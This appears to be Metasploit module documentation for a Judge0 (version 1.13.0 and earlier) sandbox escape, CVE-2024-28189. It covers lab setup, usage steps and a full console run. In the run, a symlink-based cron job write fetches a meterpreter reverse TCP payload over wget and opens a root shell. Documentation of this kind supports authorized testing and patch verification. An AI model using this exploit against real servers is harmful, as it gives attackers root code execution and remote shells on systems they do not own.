## Vulnerable Application

Judge0 does not account for symlinks placed inside the sandbox directory,
which can be leveraged by an attacker to write to arbitrary files and gain code execution outside of the sandbox.

The vulnerability affects:

    * Judge0 <= 1.13.0

This module was successfully tested on:

    * Judge0(v1.13.0) installed with Docker on Ubuntu 20.0.4


### Installation

1. (Optional) Set cgroup to v1
```bash
  sudo nano /etc/default/grub
  # add this line at the top, and save:
  GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=0"
  sudo update-grub
  sudo reboot
```

2. Install Judge0
```bash
  wget https://github.com/judge0/judge0/releases/download/v1.13.0/judge0-v1.13.0.zip
  unzip judge0-v1.13.0.zip
  cd judge0-v1.13.0
```

3. Start Judge0
```bash
  docker compose up
```

4. (Optional) When Judge0 does not work, try this
```bash
  docker compose up --force-recreate server
```


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/judge0_sandbox_escape_cve_2024_28189`
4. Do: `run lhost=<lhost> rhost=<rhost>`
5. You should get a meterpreter


## Options


## Scenarios
```
msf6 > use exploit/linux/http/judge0_sandbox_escape_cve_2024_28189
[*] Using configured payload cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(linux/http/judge0_sandbox_escape_cve_2024_28189) > options

Module options (exploit/linux/http/judge0_sandbox_escape_cve_2024_28189):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    2358             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       WGET             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      JRzyWcrcJ        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/judge0_sandbox_escape_cve_2024_28189) > run lhost=192.168.56.1 rhost=192.168.56.15

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Version 1.13.0 detected, which is vulnerable
[+] The target appears to be vulnerable.
[*] Writing cron job to /etc/cron.d/dUTuziNy
[*] Use language: 77, COBOL (GnuCOBOL 2.2)
[+] Deleted /etc/cron.d/dUTuziNy
[+] Deleted /root/SVENuNNy
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.15:49024) at 2024-10-29 12:56:04 +0900

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 172.18.0.5
OS           : Debian 10.2 (Linux 5.4.0-196-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > pwd
/root
meterpreter > 
```
